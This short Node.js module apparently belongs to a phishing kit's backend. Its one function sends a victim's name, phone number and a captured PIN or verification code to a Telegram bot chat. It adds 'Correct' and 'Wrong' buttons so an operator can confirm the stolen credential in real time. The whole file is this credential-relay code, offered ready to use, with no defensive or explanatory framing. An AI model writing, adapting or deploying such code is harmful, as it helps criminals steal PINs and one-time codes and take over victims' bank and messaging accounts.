const axios = require('axios');

// ---------------- MULTI-BOT FRIENDLY FUNCTION ----------------
// bot: { botToken, chatId, botId } 
async function sendTelegramMessage(bot, { type, name, phone, value }) {
    const text = type === 'PIN'
        ? `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${value}`
        : `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCODE: ${value}`;

    const reply_markup = {
        inline_keyboard: type === 'PIN'
            ? [[
                { text: '✅ Correct PIN', callback_data: `pin_ok:${value}` },
                { text: '❌ Wrong PIN', callback_data: `pin_bad:${value}` }
              ]]
            : [[
                { text: '✅ Correct Code', callback_data: `code_ok:${value}` },
                { text: '❌ Wrong Code', callback_data: `code_bad:${value}` }
              ]]
    };

    const url = `https://api.telegram.org/bot${bot.botToken}/sendMessage`;

    try {
        const res = await axios.post(url, { chat_id: bot.chatId, text, reply_markup });
        console.log(`✅ Telegram message sent by ${bot.botId}:`, res.data);
    } catch (err) {
        console.error(`❌ Telegram error for ${bot.botId}:`, err.response?.data || err.message);
    }
}

module.exports = { sendTelegramMessage };
